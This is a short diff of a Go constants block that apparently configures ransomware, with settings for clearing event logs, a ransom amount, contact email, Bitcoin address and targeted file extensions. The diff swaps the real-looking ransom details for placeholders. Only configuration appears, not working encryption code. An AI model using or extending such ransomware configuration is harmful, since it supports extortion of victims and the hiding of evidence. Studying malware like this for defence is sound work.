@@ -462,9 +462,9 @@ const (
     ClearEventLogs = true           // Requires admin
     
     // === Ransom Configuration ===
-    RansomAmount = "0.05 BTC"
-    ContactEmail = "Sura_recovery@protonmail.com"
-    BitcoinAddress = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
+    RansomAmount = "0.00 BTC"
+    ContactEmail = "contact@example.com"
+    BitcoinAddress = "bc1qexampleaddressxxxxxxxxxxxxxxxxxx"
     
     // === File Targeting ===
     TargetExtensions = []string{
